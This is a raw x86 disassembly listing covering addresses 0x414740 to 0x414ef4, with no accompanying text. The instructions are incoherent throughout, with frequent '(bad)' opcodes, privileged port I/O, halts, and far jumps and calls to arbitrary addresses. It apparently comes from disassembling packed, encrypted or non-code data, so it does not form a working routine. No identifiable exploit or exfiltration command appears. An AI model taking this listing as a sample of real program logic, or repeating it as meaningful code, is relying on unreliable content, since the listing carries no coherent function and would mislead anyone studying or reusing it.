  414740:	xchg   BYTE PTR [edx+0x3e],bl
  414743:	aad    0x1
  414745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414746:	mov    dl,0xce
  414748:	fdiv   st,st(3)
  41474a:	or     ecx,DWORD PTR [ebp-0xe421f94]
  414750:	(bad)  
  414751:	enter  0xa58c,0x9e
  414755:	(bad)  
  414756:	loope  0x4147aa
  414758:	popf   
  414759:	fsubp  st(2),st
  41475b:	fsubr  QWORD PTR ds:0xb3f45461
  414761:	add    bl,BYTE PTR [edi+0x1]
  414764:	gs jg  0x41479c
  414767:	adc    dh,0x2c
  41476a:	ret    0x6fa9
  41476d:	aas    
  41476e:	jnp    0x41477e
  414770:	ins    DWORD PTR es:[edi],dx
  414771:	loopne 0x414741
  414773:	ror    BYTE PTR [edi+0x7fad4a11],1
  414779:	sbb    DWORD PTR [esp+edx*8],eax
  41477c:	sub    BYTE PTR [edx-0x42e9273a],dl
  414782:	je     0x414797
  414784:	or     DWORD PTR [eax*4+0x3d3861dd],esp
  41478b:	test   edi,0xaf36bd41
  414791:	add    BYTE PTR [ebx-0x6f36480c],ah
  414797:	jle    0x414742
  414799:	in     al,dx
  41479a:	jns    0x4147ef
  41479c:	or     bl,BYTE PTR [edi]
  41479e:	lahf   
  41479f:	sar    cl,cl
  4147a1:	fisubr WORD PTR [ecx]
  4147a3:	mov    es,WORD PTR [ebx+edx*2-0x52]
  4147a7:	addr16 xor eax,0xf2f5986c
  4147ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147ae:	xor    bl,BYTE PTR [eax+0x53125743]
  4147b4:	pusha  
  4147b5:	adc    dh,BYTE PTR [edi+edi*8]
  4147b8:	out    0x0,eax
  4147ba:	into   
  4147bb:	jecxz  0x4147a2
  4147bd:	add    BYTE PTR [edi],al
  4147bf:	ins    DWORD PTR es:[edi],dx
  4147c0:	cdq    
  4147c1:	mov    ch,0x56
  4147c3:	mov    ch,0xa
  4147c5:	inc    edi
  4147c6:	pop    edx
  4147c7:	pop    es
  4147c8:	push   cs
  4147c9:	icebp  
  4147ca:	sub    al,0x93
  4147cc:	mov    ds:0x49187a4b,al
  4147d1:	cld    
  4147d2:	adc    DWORD PTR [edx+0x19198990],ecx
  4147d8:	or     BYTE PTR [ebx],bh
  4147da:	out    dx,eax
  4147db:	inc    ebx
  4147dc:	jo     0x41477b
  4147de:	xchg   esi,eax
  4147df:	retf   0x5ede
  4147e2:	fstp   DWORD PTR [edi]
  4147e4:	add    BYTE PTR [eax],ah
  4147e6:	retf   
  4147e7:	js     0x414831
  4147e9:	(bad)  [ebx+0x40]
  4147ec:	in     al,dx
  4147ed:	retf   0xfdfc
  4147f0:	fwait
  4147f1:	stos   BYTE PTR es:[edi],al
  4147f2:	aam    0x78
  4147f4:	(bad)  
  4147f5:	push   ebx
  4147f6:	cmp    DWORD PTR [ecx+0xd],edi
  4147f9:	push   eax
  4147fa:	arpl   dx,dx
  4147fc:	jns    0x414843
  4147fe:	mov    ebx,DWORD PTR [edx+eiz*1-0x15797749]
  414805:	call   0x26866841
  41480a:	mov    ah,0x2c
  41480c:	fsubr  st(5),st
  41480e:	mov    al,ds:0xfabf87ea
  414813:	ins    DWORD PTR es:[edi],dx
  414814:	cmp    DWORD PTR [edi-0x7e9a5b27],0x5c284e3
  41481e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481f:	out    dx,eax
  414820:	xchg   ebp,eax
  414821:	icebp  
  414822:	xchg   ebp,eax
  414823:	data16 jno 0x4147e3
  414826:	xor    cl,al
  414828:	push   eax
  414829:	dec    esp
  41482a:	imul   ecx,DWORD PTR [ecx-0x69],0xfffffffe
  41482e:	xor    BYTE PTR [ebx],cl
  414830:	xchg   esi,eax
  414831:	inc    ebp
  414832:	lods   eax,DWORD PTR ds:[esi]
  414833:	dec    ebp
  414834:	cld    
  414835:	pushf  
  414836:	inc    edx
  414837:	aam    0xe6
  414839:	inc    esi
  41483a:	in     eax,dx
  41483b:	inc    ebp
  41483c:	adc    ebp,DWORD PTR [ecx-0x4f]
  41483f:	out    0xb,eax
  414841:	pop    esi
  414842:	adc    al,0x95
  414844:	add    eax,0xd9b4242f
  414849:	ret    0x9e1b
  41484c:	daa    
  41484d:	mov    ch,BYTE PTR [edi+0x6c1d7d6b]
  414853:	test   al,0x45
  414855:	jecxz  0x414853
  414857:	mov    ebx,0x5cd8d083
  41485c:	fstp   TBYTE PTR [ebx+0x3ea96c30]
  414862:	aad    0xf1
  414864:	in     eax,dx
  414865:	xor    esi,esp
  414867:	loop   0x4148d8
  414869:	and    ecx,edx
  41486b:	out    dx,al
  41486c:	fadd   QWORD PTR [edx-0x1f]
  41486f:	ins    DWORD PTR es:[edi],dx
  414870:	hlt    
  414871:	mov    ecx,0x9cd6ba3c
  414876:	mov    bl,0x4c
  414878:	jno    0x4148de
  41487a:	and    ch,al
  41487c:	mov    BYTE PTR [esi],ch
  41487e:	mov    ch,0xd3
  414880:	outs   dx,BYTE PTR ds:[esi]
  414881:	or     edx,DWORD PTR [ebp+0x7a1c7576]
  414887:	jmp    0xa8365339
  41488c:	fcmovne st,st(4)
  41488e:	add    ch,BYTE PTR [ecx-0x5abeefab]
  414894:	fwait
  414895:	push   ecx
  414896:	mov    esp,DWORD PTR [ebx-0x52]
  414899:	xchg   esp,edx
  41489b:	test   eax,0x5037583f
  4148a0:	dec    ebx
  4148a1:	and    eax,0x625575ec
  4148a6:	jae    0x414922
  4148a8:	pop    ebx
  4148a9:	push   edi
  4148aa:	pop    ecx
  4148ab:	outs   dx,BYTE PTR ds:[esi]
  4148ac:	in     al,0x76
  4148ae:	xor    bl,dh
  4148b0:	cmp    BYTE PTR [ebx],ch
  4148b2:	adc    BYTE PTR [ecx+0x25],ch
  4148b5:	jge    0x4148bb
  4148b7:	mov    bl,0x96
  4148b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ba:	jne    0x414870
  4148bc:	loopne 0x4148d6
  4148be:	into   
  4148bf:	mov    bl,0xb9
  4148c1:	sub    BYTE PTR [ebx+0x1dd747de],ch
  4148c7:	repz mov ebx,0x9d756d8e
  4148cd:	ins    BYTE PTR es:[edi],dx
  4148ce:	fwait
  4148cf:	into   
  4148d0:	daa    
  4148d1:	dec    ebx
  4148d2:	icebp  
  4148d3:	mov    WORD PTR [edx+0x1b],gs
  4148d6:	add    ah,dh
  4148d8:	cli    
  4148d9:	add    ebp,edx
  4148db:	jecxz  0x414887
  4148dd:	das    
  4148de:	and    BYTE PTR [ebx-0x28],dh
  4148e1:	sti    
  4148e2:	or     DWORD PTR [ecx-0x62],edx
  4148e5:	je     0x4148e9
  4148e7:	dec    esp
  4148e8:	hlt    
  4148e9:	mov    dl,0x9f
  4148eb:	popa   
  4148ec:	jmp    0x1d3:0x47fdcbe7
  4148f3:	and    ebx,esp
  4148f5:	fist   WORD PTR [ebp-0x71]
  4148f8:	shl    DWORD PTR [ebx],cl
  4148fa:	adc    al,0x89
  4148fc:	cdq    
  4148fd:	rol    BYTE PTR [ebx-0x32],0x6
  414901:	shl    ebx,1
  414903:	scas   eax,DWORD PTR es:[edi]
  414904:	outs   dx,DWORD PTR ds:[esi]
  414905:	inc    edi
  414906:	sub    dl,BYTE PTR [edi-0x193b61e3]
  41490c:	xor    DWORD PTR [edx+ebx*8-0x5350c402],ecx
  414913:	fwait
  414914:	(bad)  
  414915:	bound  ebx,QWORD PTR [ebx]
  414917:	test   BYTE PTR [ebx],bl
  414919:	jbe    0x414935
  41491b:	adc    ebp,0x80217c8
  414921:	aad    0xc1
  414923:	(bad)  
  414924:	gs add al,0xbe
  414927:	xchg   BYTE PTR [edx],cl
  414929:	pop    ecx
  41492a:	pop    ecx
  41492b:	sbb    DWORD PTR [ebx+0x79ae9c10],ecx
  414931:	mov    esi,0xa16b3427
  414936:	mov    esi,0xbd4c3713
  41493b:	jbe    0x414962
  41493d:	popf   
  41493e:	pop    ds
  41493f:	or     esi,edi
  414941:	int3   
  414942:	push   esi
  414943:	push   esp
  414944:	cld    
  414945:	nop
  414946:	adc    ebx,esp
  414948:	cld    
  414949:	dec    ecx
  41494a:	push   0x6b
  41494c:	pop    eax
  41494e:	or     DWORD PTR [eax+0x3],0x91cd2223
  414955:	not    BYTE PTR [esi]
  414957:	sbb    DWORD PTR [edx-0x27bb59d3],ecx
  41495d:	inc    ebx
  41495e:	add    BYTE PTR [eax+edi*4-0x24],bh
  414962:	mov    al,0xf4
  414964:	scas   eax,DWORD PTR es:[edi]
  414965:	pop    edx
  414966:	out    dx,al
  414967:	sub    DWORD PTR [ebx],ebx
  414969:	stos   DWORD PTR es:[edi],eax
  41496a:	inc    esi
  41496b:	mov    al,ds:0x6b7f2128
  414970:	inc    ebp
  414971:	test   DWORD PTR [edi+0xa],edi
  414974:	aad    0xdb
  414976:	(bad)  
  414977:	nop
  414978:	xchg   DWORD PTR [ebx],esp
  41497a:	add    al,0x94
  41497c:	out    dx,eax
  41497d:	cmp    al,BYTE PTR [ecx]
  41497f:	sub    dl,BYTE PTR [ebx+0x75]
  414982:	xchg   esi,eax
  414983:	inc    eax
  414984:	pop    esp
  414985:	xor    BYTE PTR [ebp+0x6d],0x8e
  414989:	or     esi,edx
  41498b:	add    BYTE PTR es:[ecx-0x3b],0xfb
  414990:	push   cs
  414991:	mov    ecx,0xabbe065
  414996:	inc    ebx
  414997:	mov    ecx,0x1f2f5d7b
  41499c:	out    dx,al
  41499d:	jb     0x414a0a
  41499f:	pop    es
  4149a0:	test   eax,0x4f8511e
  4149a5:	out    0x72,eax
  4149a7:	and    DWORD PTR [esi-0x217b0fca],eax
  4149ad:	test   eax,0xa5334925
  4149b2:	cmp    bl,0xda
  4149b5:	mov    ch,0xa
  4149b7:	dec    ebp
  4149b8:	ret    
  4149b9:	add    al,0x63
  4149bb:	fstp   DWORD PTR [edi+ebp*1]
  4149be:	aad    0xe0
  4149c0:	data16 sbb dl,BYTE PTR [edx-0x6bf945a3]
  4149c7:	mov    esp,0x33278066
  4149cc:	adc    al,0x7
  4149ce:	pop    eax
  4149cf:	out    0x60,al
  4149d1:	dec    esp
  4149d2:	in     eax,dx
  4149d3:	out    0xbe,eax
  4149d5:	dec    edi
  4149d6:	pushf  
  4149d7:	int3   
  4149d8:	test   BYTE PTR [edi],ah
  4149da:	mov    bl,0x9
  4149dc:	add    al,0xd0
  4149de:	pop    es
  4149df:	iret   
  4149e0:	jl     0x4149f3
  4149e2:	mov    edx,DWORD PTR [ebp+0x155a7a57]
  4149e8:	imul   ecx,DWORD PTR [edi-0x13],0xc97fdcaa
  4149ef:	jae    0x414a17
  4149f1:	sti    
  4149f2:	aad    0x38
  4149f4:	mov    dl,0xb4
  4149f6:	push   eax
  4149f7:	test   al,0xbd
  4149f9:	push   esp
  4149fa:	add    eax,0xfdceb0ee
  4149ff:	mov    ecx,0x9ad76ff
  414a04:	mov    BYTE PTR [edi],ch
  414a06:	lea    eax,[edx-0x149ed45a]
  414a0c:	cmp    DWORD PTR [edx+edi*8-0x2a5dccea],ebp
  414a13:	push   0x4f
  414a15:	in     eax,0x1a
  414a17:	retf   
  414a18:	inc    eax
  414a19:	repnz stos BYTE PTR es:[edi],al
  414a1b:	inc    esi
  414a1c:	xor    cl,ah
  414a1e:	in     eax,0x1a
  414a20:	mov    eax,0x85f72716
  414a25:	mov    es,WORD PTR [ebx]
  414a27:	bound  esp,QWORD PTR [esi+0x56cbc4b1]
  414a2d:	jae    0x414a41
  414a2f:	scas   al,BYTE PTR es:[edi]
  414a30:	(bad)  
  414a31:	fistp  WORD PTR [edx+0x6f]
  414a34:	stos   BYTE PTR es:[edi],al
  414a35:	fisttp QWORD PTR [edx]
  414a37:	fldz   
  414a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3a:	loop   0x414abb
  414a3c:	out    0x9f,eax
  414a3e:	loopne 0x4149f4
  414a40:	jp     0x4149c8
  414a42:	retf   0x5d0f
  414a45:	mov    eax,0x40ca940b
  414a4a:	pop    esp
  414a4b:	push   es
  414a4c:	out    dx,eax
  414a4d:	test   eax,0x3aacdf84
  414a52:	in     eax,dx
  414a53:	jecxz  0x414a2c
  414a55:	pop    ss
  414a56:	imul   esp,ecx,0xb7098e9b
  414a5c:	hlt    
  414a5d:	les    edi,FWORD PTR [ebp-0x58]
  414a60:	aam    0xcc
  414a62:	cld    
  414a63:	pop    ss
  414a64:	mov    esp,0x8faf896b
  414a69:	add    DWORD PTR [eax+esi*4-0x164c066d],ebp
  414a70:	push   ebx
  414a71:	push   ss
  414a72:	ss push 0xe4a27bc8
  414a78:	push   eax
  414a79:	jno    0x414a55
  414a7b:	mov    eax,fs
  414a7d:	push   edi
  414a7e:	inc    ebp
  414a7f:	lock lods eax,DWORD PTR ds:[esi]
  414a81:	sbb    ecx,ebx
  414a83:	out    dx,al
  414a84:	(bad)  
  414a85:	xchg   edx,eax
  414a86:	jbe    0x414adf
  414a88:	not    edx
  414a8a:	xchg   ecx,eax
  414a8b:	test   DWORD PTR [edi+0x69],edx
  414a8e:	push   0xafe7159f
  414a93:	fcomp  QWORD PTR ss:[ebp-0x52]
  414a97:	xlat   BYTE PTR ds:[ebx]
  414a98:	scas   al,BYTE PTR es:[edi]
  414a99:	mov    dl,0xc0
  414a9b:	lock mov edx,DWORD PTR [esi+0x275ce12d]
  414aa2:	rcr    BYTE PTR [edi+0x4d],1
  414aa5:	mov    bh,0x6d
  414aa7:	xchg   ecx,eax
  414aa8:	les    ecx,FWORD PTR [ebx-0xd]
  414aab:	and    DWORD PTR [esi+0x33],0x68
  414aaf:	inc    ebx
  414ab0:	ficomp WORD PTR [ecx+0x154102ac]
  414ab6:	imul   edx,DWORD PTR [esi],0xd32783a
  414abc:	sub    dx,WORD PTR [ebx]
  414abf:	inc    esi
  414ac0:	add    bl,BYTE PTR [ecx-0x36]
  414ac3:	push   es
  414ac4:	dec    ebp
  414ac5:	jnp    0x414b30
  414ac7:	aad    0x8b
  414ac9:	jo     0x414ad6
  414acb:	leave  
  414acc:	xchg   edi,eax
  414acd:	aam    0x78
  414acf:	jnp    0x414afc
  414ad1:	in     al,0xb6
  414ad3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414ad5:	jmp    0xd803a556
  414ada:	push   es
  414adb:	int    0x24
  414add:	adc    eax,0x1ae214ac
  414ae2:	leave  
  414ae3:	xchg   BYTE PTR [ebx-0x6ea96eba],ah
  414ae9:	or     eax,0x7440cdc8
  414aee:	add    al,0x78
  414af0:	adc    eax,0x70dba5c8
  414af5:	mov    edi,0xf155245d
  414afa:	dec    ebp
  414afb:	mov    al,ds:0x31a3b22c
  414b00:	sub    ecx,esi
  414b02:	bound  eax,QWORD PTR [esi]
  414b04:	cdq    
  414b05:	and    eax,0xa25b25ba
  414b0a:	fwait
  414b0b:	(bad)  
  414b0c:	fnstenv [eax+0x55ab0d27]
  414b12:	repz retf 
  414b14:	popf   
  414b15:	in     eax,dx
  414b16:	pop    ds
  414b17:	mov    edi,0x13b27593
  414b1c:	ins    DWORD PTR es:[edi],dx
  414b1d:	(bad)  
  414b1e:	in     al,dx
  414b1f:	fisttp QWORD PTR [edi+0x40]
  414b22:	and    eax,0x4a3fc5bb
  414b27:	inc    esi
  414b28:	daa    
  414b29:	adc    DWORD PTR [ebx],0x66dcea49
  414b2f:	xor    al,0x42
  414b31:	test   eax,0xc88ad603
  414b36:	xor    ah,BYTE PTR [eax]
  414b38:	cmp    BYTE PTR [edi-0x166277ba],dl
  414b3e:	sbb    DWORD PTR [ebp-0x5c8e542b],eax
  414b44:	rcl    BYTE PTR [esi+0x4f],cl
  414b47:	xchg   ecx,eax
  414b48:	rcr    DWORD PTR [ebx],1
  414b4a:	fsubr  QWORD PTR [eax+0x26]
  414b4d:	jmp    FWORD PTR [edi-0x4b]
  414b50:	xchg   esp,eax
  414b51:	pop    edx
  414b52:	push   ecx
  414b53:	std    
  414b54:	jge    0x414b71
  414b56:	in     al,0xfd
  414b58:	sar    edx,0x93
  414b5b:	sbb    BYTE PTR [ecx-0x7d],0x9d
  414b5f:	lods   eax,DWORD PTR cs:[esi]
  414b61:	rcr    BYTE PTR [eax-0x3f9ddb99],cl
  414b67:	mov    bl,0xf7
  414b69:	repz lock sbb eax,ebp
  414b6d:	(bad)  
  414b6f:	aaa    
  414b70:	shl    esp,cl
  414b72:	pop    esi
  414b73:	aas    
  414b74:	mov    DWORD PTR [edx],ebx
  414b76:	mov    bh,0x48
  414b78:	(bad)  
  414b7a:	loopne 0x414bcd
  414b7c:	and    al,0xcd
  414b7e:	stos   DWORD PTR es:[edi],eax
  414b7f:	stc    
  414b80:	inc    edx
  414b81:	xor    DWORD PTR [eax+0x783e83fb],esp
  414b87:	sub    eax,0xd340d450
  414b8c:	mov    DWORD PTR [ecx+0x73b62961],edi
  414b92:	and    eax,0xddd2d5a
  414b97:	sub    DWORD PTR [ecx],ebx
  414b99:	sbb    esp,DWORD PTR [edi]
  414b9b:	push   cs
  414b9c:	frstor [esi+edx*2]
  414b9f:	hlt    
  414ba0:	outs   dx,BYTE PTR ds:[esi]
  414ba1:	rol    esi,1
  414ba3:	loope  0x414b54
  414ba5:	lods   al,BYTE PTR ds:[esi]
  414ba6:	(bad)  
  414ba7:	retf   0x5c97
  414baa:	mov    eax,ds:0xcf62cce0
  414baf:	rol    bl,0xc8
  414bb2:	and    DWORD PTR [edx+0x484d360f],esi
  414bb8:	jns    0x414bb1
  414bba:	inc    edx
  414bbb:	cld    
  414bbc:	sub    al,0x5
  414bbe:	dec    edi
  414bbf:	imul   edi,eax,0x2d
  414bc2:	cmp    DWORD PTR [eax+0x68],0x485986bf
  414bc9:	pop    edx
  414bca:	dec    esp
  414bcb:	mov    edi,0x67ff28d1
  414bd0:	repnz repnz fs or al,0x43
  414bd5:	cmp    bh,BYTE PTR [ebx-0x4f909c98]
  414bdb:	shl    bh,0xc9
  414bde:	xchg   esp,eax
  414bdf:	xchg   BYTE PTR [ebx-0x32cd62be],cl
  414be5:	shl    DWORD PTR [edx],0xa5
  414be8:	sahf   
  414be9:	push   eax
  414bea:	test   eax,0x71459b86
  414bef:	fisubr DWORD PTR [edi-0x20af9ee1]
  414bf5:	outs   dx,DWORD PTR ds:[esi]
  414bf6:	(bad)  
  414bf7:	lahf   
  414bf8:	fistp  DWORD PTR [ecx+eiz*8-0x29]
  414bfc:	or     ah,ch
  414bfe:	fwait
  414bff:	aas    
  414c00:	mov    esi,DWORD PTR [esi+0x52]
  414c03:	test   al,0x54
  414c05:	ret    
  414c06:	leave  
  414c07:	aaa    
  414c08:	mov    bh,dh
  414c0a:	out    dx,eax
  414c0b:	push   ebx
  414c0c:	rcr    DWORD PTR [eax+0x2d27e540],0xd8
  414c13:	mov    eax,ds:0x5c930ae9
  414c18:	inc    edx
  414c19:	imul   eax,DWORD PTR [edi],0x33
  414c1c:	mov    dh,0xfb
  414c1e:	je     0x414c92
  414c20:	or     eax,0x2024b846
  414c25:	ins    BYTE PTR es:[edi],dx
  414c26:	mov    eax,0x3452147b
  414c2b:	xlat   BYTE PTR ds:[ebx]
  414c2c:	and    DWORD PTR [edx+0x7d200a7d],ecx
  414c32:	imul   esi,ebp,0x6a9c1ed8
  414c38:	jno    0x414c1c
  414c3a:	lods   eax,DWORD PTR ds:[esi]
  414c3b:	inc    esi
  414c3c:	ins    DWORD PTR es:[edi],dx
  414c3d:	bound  ebp,QWORD PTR [ebx-0x4]
  414c40:	inc    edx
  414c41:	jbe    0x414c79
  414c43:	dec    eax
  414c44:	aad    0xe6
  414c46:	scas   al,BYTE PTR es:[edi]
  414c47:	push   ebx
  414c48:	pop    es
  414c49:	xor    al,0x11
  414c4b:	rcl    bh,1
  414c4d:	adc    ah,BYTE PTR [esi-0x3313c02]
  414c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c54:	scas   al,BYTE PTR es:[edi]
  414c55:	int    0xfa
  414c57:	fnstcw WORD PTR [ebx-0x7db5a326]
  414c5d:	cmp    eax,0x54ef2eca
  414c62:	push   esp
  414c63:	mov    ecx,0x336a2bde
  414c68:	retf   0xf6da
  414c6b:	push   0xf
  414c6d:	pop    eax
  414c6e:	cmp    esp,esp
  414c70:	add    ch,dl
  414c72:	cwde   
  414c73:	and    ah,BYTE PTR [edx+edx*8-0x552c728]
  414c7a:	sub    edi,DWORD PTR [esi+esi*2+0x3174452a]
  414c81:	cmp    BYTE PTR [edx-0x6b],bh
  414c84:	add    eax,0xf392dfdb
  414c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c8a:	repz and DWORD PTR [ecx+ecx*8],edx
  414c8e:	lahf   
  414c8f:	and    ecx,DWORD PTR [ebx]
  414c91:	mov    ch,0x25
  414c93:	sub    edi,esi
  414c95:	scas   eax,DWORD PTR es:[edi]
  414c96:	bound  esp,QWORD PTR [ebp-0x15]
  414c99:	addr16 pushf 
  414c9b:	lods   al,BYTE PTR ds:[esi]
  414c9c:	scas   al,BYTE PTR es:[edi]
  414c9d:	mov    ch,0x73
  414c9f:	imul   esi,DWORD PTR [ebx],0x22
  414ca2:	cmp    BYTE PTR [ebx-0x6825b21f],bh
  414ca8:	ss jns 0x414cf5
  414cab:	jno    0x414cf5
  414cad:	mov    edi,0x3b315c89
  414cb2:	adc    BYTE PTR [edi],ah
  414cb4:	jecxz  0x414ced
  414cb6:	xor    BYTE PTR [edx],ch
  414cb8:	icebp  
  414cb9:	inc    ecx
  414cba:	pop    edx
  414cbb:	stc    
  414cbc:	popf   
  414cbd:	(bad)  
  414cbe:	pop    esp
  414cbf:	call   0xfb2e85cb
  414cc4:	daa    
  414cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cc6:	rcr    BYTE PTR [ebp+0xe4f196f],0x2
  414ccd:	aad    0x7c
  414ccf:	sbb    esp,DWORD PTR [eax-0x2c]
  414cd2:	inc    ebp
  414cd3:	outs   dx,BYTE PTR ds:[esi]
  414cd4:	push   cs
  414cd5:	jnp    0x414c61
  414cd7:	std    
  414cd8:	hlt    
  414cd9:	(bad)
  414cdc:	cmc    
  414cdd:	mov    al,ds:0x77e8d206
  414ce2:	jnp    0x414c90
  414ce4:	test   DWORD PTR [edx-0x7f],esp
  414ce7:	mov    esp,0xb7f5f50e
  414cec:	xor    BYTE PTR [edx],al
  414cee:	jb     0x414d4a
  414cf0:	scas   eax,DWORD PTR es:[edi]
  414cf1:	adc    esp,DWORD PTR [eax+ecx*2]
  414cf4:	mov    eax,0x82fa3052
  414cf9:	lea    eax,[eax+esi*4-0x12]
  414cfd:	mov    dh,0xd8
  414cff:	mov    edi,0x97d58afc
  414d04:	mov    dh,0x8f
  414d06:	out    dx,al
  414d07:	mov    ch,0x59
  414d09:	add    ch,BYTE PTR [ecx+0x24e6f700]
  414d0f:	iret   
  414d10:	(bad)  
  414d11:	pop    edi
  414d12:	enter  0xe9d3,0x95
  414d16:	scas   al,BYTE PTR es:[edi]
  414d17:	mov    BYTE PTR [eax],cl
  414d19:	leave  
  414d1a:	iret   
  414d1b:	xor    dl,ah
  414d1d:	dec    edx
  414d1e:	ins    DWORD PTR es:[edi],dx
  414d1f:	mov    bl,0xba
  414d21:	jp     0x414d54
  414d23:	cmp    DWORD PTR [edx-0x280c4e21],edx
  414d29:	aam    0x5b
  414d2b:	leave  
  414d2c:	mov    fs:0xad7c0f3c,al
  414d32:	loopne 0x414cdd
  414d34:	aaa    
  414d35:	push   cs
  414d36:	sbb    eax,DWORD PTR [edx-0x505a2224]
  414d3c:	sbb    esi,DWORD PTR [eax-0xd]
  414d3f:	mov    bl,0xec
  414d41:	jmp    0x414d5a
  414d43:	pop    edi
  414d44:	ja     0x414d92
  414d46:	mov    edx,0x1789716f
  414d4b:	inc    esp
  414d4c:	sub    BYTE PTR [edx],ch
  414d4e:	dec    esi
  414d4f:	stc    
  414d50:	fxch   st(1)
  414d52:	rcr    bh,1
  414d54:	jbe    0x414dc1
  414d56:	cdq    
  414d57:	retf   0x1dbe
  414d5a:	in     eax,0xd3
  414d5c:	add    al,BYTE PTR [edx+0xff875c0]
  414d62:	loop   0x414d00
  414d64:	or     bl,BYTE PTR [ebp+ebx*8-0x7485bf6]
  414d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d6c:	push   eax
  414d6d:	dec    ecx
  414d6e:	cli    
  414d6f:	push   esp
  414d70:	mov    cl,0xc7
  414d72:	inc    ecx
  414d73:	adc    eax,DWORD PTR [edx+0x31]
  414d76:	push   ss
  414d77:	and    DWORD PTR [esi-0x1],ebp
  414d7a:	loope  0x414d72
  414d7c:	addr16 sbb eax,0x5b2b0f7f
  414d82:	cld    
  414d83:	cmp    bh,0x94
  414d86:	and    al,0x74
  414d88:	daa    
  414d89:	xchg   ebx,eax
  414d8a:	cli    
  414d8b:	ror    DWORD PTR cs:[eax],cl
  414d8e:	test   DWORD PTR [edx-0x4b79b29c],0xc7ac117b
  414d98:	arpl   WORD PTR [ecx-0x66],cx
  414d9b:	sub    ecx,edi
  414d9d:	ror    ah,0x35
  414da0:	mov    al,ds:0x2603a38f
  414da5:	adc    WORD PTR [edx+0x30],di
  414da9:	repnz inc ebx
  414dab:	adc    eax,0x54166083
  414db0:	aam    0xe1
  414db2:	adc    BYTE PTR [eax-0x2c9d329a],bh
  414db8:	add    ebx,DWORD PTR [ebx-0x2c]
  414dbb:	retf   
  414dbc:	nop
  414dbd:	fs gs sar ah,0x4a
  414dc2:	jl     0x414def
  414dc4:	fimul  DWORD PTR [esi+edi*8-0x368e6f2a]
  414dcb:	nop
  414dcc:	repz mov cl,0x19
  414dcf:	sub    eax,0x6a1c6b4e
  414dd4:	push   eax
  414dd5:	out    0x28,al
  414dd7:	inc    ecx
  414dd8:	test   DWORD PTR [eax],ecx
  414dda:	hlt    
  414ddb:	jo     0x414dc5
  414ddd:	mov    DWORD PTR [ebp+edx*4-0x2fb69691],eax
  414de4:	xchg   esp,eax
  414de5:	neg    edx
  414de7:	fist   DWORD PTR [eax]
  414de9:	pusha  
  414dea:	mov    dh,0xe9
  414dec:	in     eax,dx
  414ded:	ja     0x414e34
  414def:	push   esp
  414df0:	sbb    DWORD PTR [ebp-0x410aa4c6],eax
  414df6:	mov    edx,0xcb396a16
  414dfb:	fisubr DWORD PTR es:[esi]
  414dfe:	cmp    BYTE PTR [ebx+0x18395c53],dl
  414e04:	call   0x14a718c0
  414e09:	add    eax,0xef642987
  414e0e:	and    eax,0xfa5b097a
  414e13:	jle    0x414df6
  414e15:	mov    bh,0x1a
  414e17:	jbe    0x414e2a
  414e19:	mov    ecx,DWORD PTR [eax+0x7ba7594]
  414e1f:	jnp    0x414e37
  414e21:	jge    0x414e73
  414e23:	cld    
  414e24:	das    
  414e25:	cmp    DWORD PTR [esi-0x4da768e5],0x47
  414e2c:	dec    edx
  414e2d:	enter  0x4653,0xbc
  414e31:	and    eax,DWORD PTR [ecx-0x20]
  414e34:	push   ss
  414e35:	or     al,0x5
  414e37:	fsub   st,st(7)
  414e39:	sar    DWORD PTR [ebx-0x187e05f4],1
  414e3f:	sub    eax,0xbc997cdd
  414e44:	adc    al,0x16
  414e46:	gs repnz pop es
  414e49:	cmp    edx,edi
  414e4b:	lds    esi,FWORD PTR [edi+0x2b1d9918]
  414e51:	arpl   WORD PTR [ebp+0x43],bx
  414e54:	(bad)  
  414e55:	push   ds
  414e56:	mov    WORD PTR [ebp+0xa3b2ecf],?
  414e5c:	jmp    0xfef79dbd
  414e61:	cs idiv ecx
  414e64:	cmc    
  414e65:	fld    TBYTE PTR [edx+0x3f6d2c0d]
  414e6b:	retf   0x2de8
  414e6e:	pop    ecx
  414e6f:	inc    ecx
  414e70:	test   eax,0x33e5001b
  414e75:	rcl    DWORD PTR [eax+0x1d],0xea
  414e79:	pop    ebp
  414e7a:	xchg   BYTE PTR [ecx+0x30],bl
  414e7d:	push   0x4e
  414e7f:	loop   0x414e5b
  414e81:	dec    BYTE PTR [esi+0x3f785dd1]
  414e87:	loop   0x414e26
  414e89:	xor    BYTE PTR [ecx],al
  414e8b:	ret    
  414e8c:	mov    ds:0xc8eca13e,eax
  414e91:	dec    ecx
  414e92:	lods   al,BYTE PTR ds:[esi]
  414e93:	adc    BYTE PTR [esi-0x48f783a6],0xed
  414e9a:	inc    esp
  414e9b:	call   0x41a1895b
  414ea0:	add    BYTE PTR [ebp+eiz*4-0x2fafb594],0xb1
  414ea8:	pop    es
  414ea9:	aaa    
  414eaa:	iret   
  414eab:	loop   0x414eb9
  414ead:	das    
  414eae:	lock or BYTE PTR [ecx],bh
  414eb1:	nop
  414eb2:	arpl   WORD PTR es:[esi-0x56],bx
  414eb6:	add    ebp,DWORD PTR ds:0xee13277f
  414ebc:	dec    eax
  414ebd:	jmp    0x64c:0x95a0f8a9
  414ec4:	cdq    
  414ec5:	(bad)  
  414ec6:	or     ah,al
  414ec8:	jbe    0x414eba
  414eca:	xchg   ebp,eax
  414ecb:	fwait
  414ecc:	or     ah,BYTE PTR [ecx+eiz*8-0x30]
  414ed0:	inc    edi
  414ed1:	cdq    
  414ed2:	pop    eax
  414ed3:	(bad)  
  414ed5:	xchg   edi,eax
  414ed6:	add    cl,BYTE PTR [edi-0x6c666276]
  414edc:	out    0x30,al
  414ede:	sbb    DWORD PTR [edx-0x4594b864],0xffffffee
  414ee5:	jbe    0x414ea6
  414ee7:	fld    TBYTE PTR [eax-0xda7d461]
  414eed:	int    0x82
  414eef:	lods   al,BYTE PTR ds:[esi]
  414ef0:	adc    esi,ebp
  414ef2:	dec    ecx
  414ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ef4:	mov    bh,0x46
